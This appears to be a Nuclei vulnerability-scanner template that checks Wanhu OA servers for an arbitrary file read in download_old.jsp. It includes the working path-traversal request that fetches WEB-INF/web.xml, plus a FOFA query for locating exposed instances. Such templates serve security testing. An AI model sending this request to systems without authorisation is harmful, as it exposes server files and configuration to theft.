http:
- matchers:
  - condition: and
    type: word
    words:
    - <?xml version=
    - web-app
    - display-name
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/defaultroot/download_old.jsp?path=..&name=x&FileName=WEB-INF/web.xml'
id: wanhu-download-old-file-read
info:
  author: SleepingBag945
  description: 'There is an arbitrary file download vulnerability in the Wanhu OA
    download_old.jsp file. An attacker can download any file on the server through
    the vulnerability.

    '
  metadata:
    fofa-query: "app=\"\u4E07\u6237\u7F51\u7EDC-ezOFFICE\""
    max-request: 1
    verified: true
  name: Wanhu OA download_old.jsp - Arbitrary File Read
  reference:
  - "http://wiki.peiqi.tech/wiki/oa/\u4E07\u6237OA/\u4E07\u6237OA%20download_old.jsp%20\u4EFB\
    \u610F\u6587\u4EF6\u4E0B\u8F7D\u6F0F\u6D1E.html"
  - https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/wanhu-oa-download-old-file-read.yaml
  severity: high
  tags: wanhu,lfi,vuln
